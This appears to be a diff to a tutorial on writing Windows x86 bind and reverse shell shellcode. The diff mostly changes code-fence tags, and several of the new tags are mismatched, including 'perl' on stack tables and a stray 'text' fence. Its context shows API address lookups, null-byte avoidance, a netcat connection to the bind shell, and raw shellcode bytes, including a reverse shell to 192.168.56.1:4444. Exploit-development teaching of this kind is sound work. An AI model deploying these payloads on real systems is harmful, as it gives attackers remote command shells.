@@ -27,7 +27,7 @@ If we scroll down, we learn that bind() is located in Ws2_32.dll. Now we can use
 arwin - win32 address resolution program - by steve hanna - v.01
 bind is located at 0x71ab4480 in ws2_32.dll
 ```
-```
+```text
 > arwin.exe ws2_32.dll listen
 arwin - win32 address resolution program - by steve hanna - v.01
 listen is located at 0x71ab8cd3 in ws2_32.dll
@@ -35,7 +35,7 @@ listen is located at 0x71ab8cd3 in ws2_32.dll
 
 We also know that we are required to load this DLL, at least at this stage, and a Google search reveals the LoadLibraryA() system call: <a href="https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya">https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya</a>, which is found in kernel32.dll:
 
-```
+```text
 > arwin.exe kernel32.dll LoadLibraryA
 arwin - win32 address resolution program - by steve hanna - v.01
 LoadLibraryA is located at 0x7c801d7b in kernel32.dll
@@ -106,7 +106,7 @@ push 0x5f327377 ; "ws2_"
 ```
 
 Notice the nulls in pure hex bytes:
-```
+```text
 6833320000687773325F
 ```
 
@@ -142,7 +142,7 @@ call eax
 ```
 
 The first instruction is `add esp, 0xFFFFFE70`, which is a way of creating space on the stack without generating null bytes. The normal way of achieving this would be to subtract a value from ESP (remember the stack grows downwards). However, this results in null bytes:
-```
+```text
 nasm > sub esp, 0x190
 00000000  81EC90010000      sub esp,0x190
 ```
@@ -225,7 +225,7 @@ server.sin_port = htons(4444);         # 0x5c11
 ```
 
 What we need to do is to have a pointer to the following values and pass it as the second argument:
-```
+```text
 5c110002
 00000000
 ```
@@ -254,7 +254,7 @@ call eax
 
 The stack looks like this right before calling bind():
 
-```
+```text
    Addr        Value
    00000001    00000064 (Arg1, SOCKET s)
    00000002    00000004 (Arg2, const sockaddr *addr) ---
@@ -356,7 +356,7 @@ call eax
 
 Starting state, where ESP points to the *addr structure from the bind() function.
 
-```
+```perl
        Addr        Value
        0022FE1C    FFFFFFF4
        0022FE20    00000000
@@ -366,7 +366,7 @@ ESP -> 0022FE24    5C110002
 
 After `mov DWORD [esp-0x5], 0x646d6341`, the string "Acmd" is placed 5 bytes from ESP. Since the string only use 3 bytes of the "row" with only zeros, we have a clean null terminated "cmd" string on the stack.
 
-```
+```perl
        Addr        Value      Ascii
        0022FE1C    41FFFFF4   "...A"
        0022FE20    00646D63   "cmd\0"
@@ -376,7 +376,7 @@ ESP -> 0022FE24    5C110002
 
 `lea eax, [esp-0x4]` stores a pointer to the "cmd\0" string in EAX.
 
-```
+```perl
        Addr        Value      Ascii
        0022FE1C    41FFFFF4   "...A"
 EAX -> 0022FE20    00646D63   "cmd\0"
@@ -386,16 +386,16 @@ ESP -> 0022FE24    5C110002
 
 `lea esp, [esp-0x4]` adjusts ESP, or else data will be overwritten when we push more values on the stack.
 
-```
+```perl
            Addr        Value      Ascii
            0022FE1C    41FFFFF4   "...A"
 ESP/EAX -> 0022FE20    00646D63   "cmd\0"
            0022FE24    5C110002
            0022FE28    00000000
-```
+```text
 
 `push eax` pushes the address of the "cmd\0" string on the stack and overwrites the previous trash there.
-```
+```perl
        Addr        Value      Ascii
 ESP -> 0022FE1C    0022FE20   
 EAX -> 0022FE20    00646D63   "cmd\0"
@@ -523,7 +523,7 @@ Time to compile this thing. This can be done on Windows by downloading the follo
 ```
 
 Or you can cross-compile this on a Linux box:
-```nasm
+```text
 $ nasm -f win32 bind.asm -o bind.o
 $ ld -m i386pe bind.o -o bind.exe
 ```
@@ -538,7 +538,7 @@ Connect to it using netcat and we got a shell!
 
 If we were going to use the shellcode as a payload for an exploit, then we can easily reduce the size by removing the code to load the socket library (LoadLibraryA()) and the socket startup call (WSAStartup()). This is because the target vulnerable software probably has already loaded the ws2_32.dll library and ran a socket startup call. This can be confirmed with the following command, which will display all loaded DLLs by the executable:
 
-```
+```text
 > tasklist.exe /m /fi "imagename eq vulnerable.exe"
 ```
 
@@ -546,7 +546,7 @@ If we were going to use the shellcode as a payload for an exploit, then we can e
 
 Compiled without LoadLibraryA() and WSAStartup().
 
-```
+```text
 $ for i in $(objdump -d shell.exe | grep "^ " | cut -f2); do echo -n '\x'$i; done; echo
 \x31\xc0\x50\x50\x50\x50\x6a\x01\x6a\x02\xb8\x6a\x8b\xab\x71\xff\xd0\x89\xc3\x31
 \xc0\x50\xb8\x02\x01\x11\x5c\xfe\xcc\x50\x89\xe0\x6a\x10\x50\x53\xb8\x80\x44\xab
@@ -601,7 +601,7 @@ C0 = 192
 
 Compiled without LoadLibraryA() and WSAStartup().
 
-```
+```text
 $ for i in $(objdump -d reverse.exe | grep "^ " | cut -f2); do echo -n '\x'$i; done; echo
 \x31\xc0\x50\x50\x50\x50\x6a\x01\x6a\x02\xb8\x6a\x8b\xab\x71\xff\xd0\x89\xc3\x68
 \xc0\xa8\x38\x01\xb8\x02\x01\x11\x5c\xfe\xcc\x50\x89\xe6\x31\xc0\xb0\x10\x50\x56
